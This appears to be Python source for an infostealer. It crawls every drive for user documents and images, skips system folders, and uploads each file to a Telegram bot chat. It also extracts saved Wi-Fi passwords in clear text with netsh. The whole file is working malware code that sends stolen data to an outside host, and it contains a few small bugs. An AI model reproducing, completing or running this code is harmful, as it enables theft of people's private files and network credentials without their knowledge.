from modules.modules import *


BLACKLIST_DIRS = [
    "C:\\Windows\\",
    "C:\\Program Files\\",
    "C:\\Program Files (x86)\\",
    "C:\\$Recycle.Bin\\",
    "C:\\AMD\\",
    "C:\\ProgramData\\",
    "C:\\MinGW\\",
    "C:\\Recovery\\",
    "C:\\Dell\\",
    "C:\\Intel\\",
    "C:\\PerfLogs\\",
    "C:\\Users\\Default\\",
    "C:\\Users\\Public\\",
    f"{os.path.expanduser('~')}\\AppData\\",
    f"{os.path.expanduser('~')}\\.vscode\\",
]

ALLOWED_EXT = [".txt", ".pdf", ".png", ".jpg", ".jpeg", ".gif", ".docx", ".xls"]
MAX_SIZE = 20


class fileParser:
    """Class defnition for file searcher"""
    def __init__(self):
        self.USER_DIR = os.path.expanduser("~")
        self.BLACKLISTED_DIRS = BLACKLIST_DIRS
        self.MAX_FILE_SIZE_MB = MAX_SIZE
        self.filelist = []
        self.filelist_json = None
        # Get a list of all available drives
        drives = [
            "%s:\\" % d
            for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            if os.path.exists("%s:" % d)
        ]
        # Split the drives into groups of 4
        drive_groups = [drives[i : i + 4] for i in range(0, len(drives), 4)]
        # Search for files in each group in parallel
        for group in drive_groups:
            threads = []
            for drive in group:
                thread = threading.Thread(
                    target=self.search_files, args=(drive,), daemon=True
                )
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

    def check_file(self, file_path):
        """
        check the file for flags specified
        1. Permission?
        2. Blacklisted?
        3. too heavy?
        4. valid file?
        """
        allowed_extensions = ALLOWED_EXT
        max_size_mb = self.MAX_FILE_SIZE_MB
        if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
            logging.debug(f"Skipping file {file_path} - invalid file type")
            return False
        elif os.path.getsize(file_path) > max_size_mb * 1024 * 1024:
            logging.debug(f"Skipping file {file_path} - file size too large")
            return False
        elif os.path.isfile(file_path) and not os.access(file_path, os.R_OK):
            logging.debug(f"Skipping file {file_path} - file requires admin privileges")
            return False
        elif any(
            blacklisted_dir in file_path for blacklisted_dir in self.BLACKLISTED_DIRS
        ):
            logging.debug(f"Skipping file {file_path} - in blacklisted directory")
            return False
        else:
            return True

    def search_files(self, root_dir):
        """Search for files in directories except stated in BLACKLISTED_DIRS"""
        for root, dirs, files in os.walk(root_dir):
            if any(
                blacklisted_dir in root for blacklisted_dir in self.BLACKLISTED_DIRS
            ):
                # Skip blacklisted directories
                continue
            for file in files:
                file_path = os.path.join(root, file)
                if self.check_file(file_path):
                    self.filelist.append(file_path)

        # saved into json format for pretty viewing
        self.filelist_json = json.dumps(self.filelist, indent=4)

    def thread_files(self, root_dirs):
        """Pass into a thread for fast searching"""
        for root_dir in root_dirs:
            self.search_files(root_dir)


class stealer:
    """Class Defniiton for the stealer."""
    def __init__(self) -> None:
        self.fileparse = fileParser()
        self.filelist = self.fileparse.filelist
        self.bot = telepot.Bot(TOKEN)

    def send_message(self , message:str):
        """
        Send message to chat `CHATID` .
        If somehow, the length of the text is greater than 4096 characters, 
        it will split them and send them by chunks.
        """
        if len(message) > 4096:
            chunks = self.split(message)
            for chunk in chunks:
                yield self.bot.sendMessage(self.id, chunk)
        else:
            return self.bot.sendMessage(self.id, message)

    def split(self, text: str, chunk_size=4096):
        """Split text by equal chunks. Also stores the remainders."""
        return [text[i : i + chunk_size] for i in range(0, len(text), chunk_size)]

    def send_files(self , interval=20):
        """
        Sends the files defined in `self.filelist` one by one 
        with a time gap.
        
        """
        for file in self.filelist:
            try:
                self.bot.sendDocument(CHATID , open(file , 'r'))
                time.sleep(interval)
            except:
                continue

    def get_wifi_passwords(self):
        """`self` explanatory."""
        _command = "netsh wlan show profile"
        proc = subprocess.check_output(_command, shell=True)
        networks = re.findall(b"(?:Profile\s*:\s)(.*)", proc)
        result = " "
        for name in networks:
            command = f"""netsh wlan show profile name="{name.decode()}" key=clear  """
            result += subprocess.check_output(command, shell=True).decode("utf-8")
        return result

    def connect(self , retries=10 , interval=20):
        """
        Tries to send a simple message for testing purposes.
        if it fails, it tries again after a specified amount
        of time.
        """
        i = 0
        while i <= retries:
            try:
                self.bot.sendMessage(CHATID , 'connected...')
                break
            except:
                time.sleep(interval)
                i+=1

